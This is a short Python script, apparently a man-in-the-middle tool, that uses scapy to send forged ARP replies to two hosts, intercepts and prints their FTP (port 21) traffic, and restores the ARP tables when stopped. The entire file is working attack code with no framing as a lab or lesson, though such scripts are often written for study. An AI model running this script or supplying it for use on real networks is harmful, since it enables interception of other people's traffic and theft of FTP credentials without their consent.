from parse_args import parse_arguments
import scapy.all as scapy
import os

def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def arp_spoofing(IP_src, IP_target, MAC_target):
    packet = scapy.ARP(op=2, pdst=IP_target, psrc=IP_src, hwdst=MAC_target)
    scapy.send(packet, verbose=False)

def restore_arp(IP_src, MAC_src, IP_target, MAC_target):
    packet = scapy.ARP(op=2, pdst=IP_target, psrc=IP_src, hwdst=MAC_target, hwsrc=MAC_src) #resend with the right source MAC address
    scapy.send(packet, verbose=False)

def main():
    args = parse_arguments()
    print(args)
    try:
        while True:
            arp_spoofing(args.IP_src, args.IP_target, args.MAC_target)
            arp_spoofing(args.IP_target, args.IP_src, args.MAC_src)
            pkts = scapy.sniff(count=5,filter=f"tcp and host {args.IP_src} and port 21", prn=lambda x:x.summary())
            print(pkts)
    except KeyboardInterrupt:
        print("Stopping process, restoring default ARP table...")
        restore_arp(args.IP_src, args.MAC_src, args.IP_target, args.MAC_target)
        restore_arp(args.IP_target, args.MAC_target, args.IP_src, args.MAC_src)

if __name__ == "__main__":
    main()
